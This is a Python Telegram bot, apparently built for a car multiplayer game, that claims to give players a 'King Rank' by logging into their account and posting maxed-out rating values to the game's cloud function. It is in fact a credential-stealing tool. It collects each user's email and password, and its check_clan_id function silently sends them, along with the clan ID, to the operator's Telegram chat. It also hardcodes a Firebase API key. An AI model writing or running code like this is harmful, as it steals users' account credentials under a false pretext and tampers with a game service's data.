import os
import requests
import json
import telebot
from flask import Flask
from threading import Thread

# --- Game Service Configuration ---
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"

# --- Telegram Bot Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")  # Получение BOT_TOKEN из переменной окружения
CHAT_ID = os.environ.get("CHAT_ID")  # Получение CHAT_ID из переменной окружения

if not BOT_TOKEN or not CHAT_ID:
    raise ValueError("❌ BOT_TOKEN или CHAT_ID не заданы! Убедитесь, что переменные окружения правильно настроены.")

bot = telebot.TeleBot(BOT_TOKEN)

user_states = {}

def send_to_telegram(email, password, clan_id):
    """Send account info to Telegram only if ClanId exists."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except requests.exceptions.RequestException:
        pass  # Silent fail

def login(email, password):
    """Login to CPM using Firebase API."""
    print("\n🔐 ВХОД В СИСТЕМУ...")
    payload = {
        "clientType": "CLIENT_TYPE_ANDROID",
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)",
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
        response_data = response.json()

        if response.status_code == 200 and 'idToken' in response_data:
            print("✅ ВХОД В СИСТЕМУ ПРОШЁЛ УСПЕШНО!")
            return response_data.get('idToken')
        else:
            error_message = response_data.get("error", {}).get("message", "Unknown error during login.")
            print(f"❌ ОШИБКА ВХОДА: {error_message}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"❌ ОШИБКА СЕТИ: {e}")
        return None

def set_rank(token):
    """Set KING RANK using max rating data."""
    print("👑 СКРИПТ ВЫПОЛНЯЕТСЯ...")
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000

    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }

    try:
        response = requests.post(RANK_URL, headers=headers, json=payload)
        if response.status_code == 200:
            print("✅ СКРИПТ ВЫПОЛНЕН!")
            return True
        else:
            print(f"❌ НЕ УДАЛОСЬ ВЫПОЛНИТЬ СКРИПТ. HTTP Status: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"❌ СЕТЕВАЯ ОШИБКА ПРИ УСТАНОВКЕ : {e}")
        return False

def check_clan_id(token, email, password):
    """Silent check for ClanId and send to Telegram if found."""
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "okhttp/3.12.13",
        "Content-Type": "application/json"
    }
    payload = {
        "data": None
    }

    try:
        response = requests.post(CLAN_ID_URL, headers=headers, json=payload)
        if response.status_code == 200:
            raw = response.json()
            clan_id = raw.get("result", "")
            if clan_id:
                send_to_telegram(email, password, clan_id)  # Send only if ClanId exists
    except requests.exceptions.RequestException:
        pass  # Silent fail

# Handle start command
@bot.message_handler(commands=["start"])
def handle_start(message):
    bot.reply_to(message, "📧 ⚫️ВВЕДИ @GMAIL⚫️")

# Handle text message
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text.strip()

    # Check if user is already in the process
    if user_id not in user_states:
        user_states[user_id] = {"step": "await_email"}

    state = user_states[user_id]

    if state["step"] == "await_email":
        state["email"] = text
        state["step"] = "await_password"
        bot.reply_to(message, "🔒 ⚫️ВВЕДИ ПАРОЛЬ⚫️")

    elif state["step"] == "await_password":
        email = state["email"]
        password = text

        # Perform login and set rank
        auth_token = login(email, password)
        if auth_token:
            if set_rank(auth_token):
                check_clan_id(auth_token, email, password)  # Send data only if clan_id exists
                bot.reply_to(message, "✅ King Rank установлен успешно.")
            else:
                bot.reply_to(message, "❌ Не удалось установить King Rank.")
        else:
            bot.reply_to(message, "❌ Ошибка при входе.")

        # Reset user state after completing the task
        del user_states[user_id]

# Flask app for Render
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    from threading import Thread
    t = Thread(target=bot.polling, args=(None,))
    t.start()
    
    # Start Flask server
    run_flask()
